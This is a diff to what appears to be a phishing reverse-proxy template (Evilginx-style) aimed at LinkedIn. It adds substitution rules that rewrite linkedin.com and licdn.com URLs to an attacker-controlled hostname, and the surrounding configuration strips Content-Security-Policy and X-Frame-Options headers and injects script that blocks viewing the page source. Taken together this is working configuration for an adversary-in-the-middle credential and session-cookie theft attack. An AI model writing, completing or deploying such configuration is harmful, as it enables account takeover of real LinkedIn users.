@@ -55,6 +55,12 @@ injections:
           if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
         }
       })();
+sub_filters:
+  - {triggers_on: "www.linkedin.com", orig_sub: "www", domain: "linkedin.com", search: "https://www.linkedin.com/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "static.licdn.com", orig_sub: "static", domain: "licdn.com", search: "https://static.licdn.com/", replace: "https://{hostname}/_listatic/", mimes: ["text/html", "application/javascript", "text/css"]}
+  - {triggers_on: "media.licdn.com", orig_sub: "media", domain: "licdn.com", search: "https://media.licdn.com/", replace: "https://{hostname}/_limedia/", mimes: ["text/html", "application/javascript", "text/css"]}
+  - {triggers_on: "api.linkedin.com", orig_sub: "api", domain: "linkedin.com", search: "https://api.linkedin.com/", replace: "https://{hostname}/_liapi/", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "platform.linkedin.com", orig_sub: "platform", domain: "linkedin.com", search: "https://platform.linkedin.com/", replace: "https://{hostname}/_liplatform/", mimes: ["text/html", "application/javascript"]}
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
   - {action: "remove", name: "X-Frame-Options"}
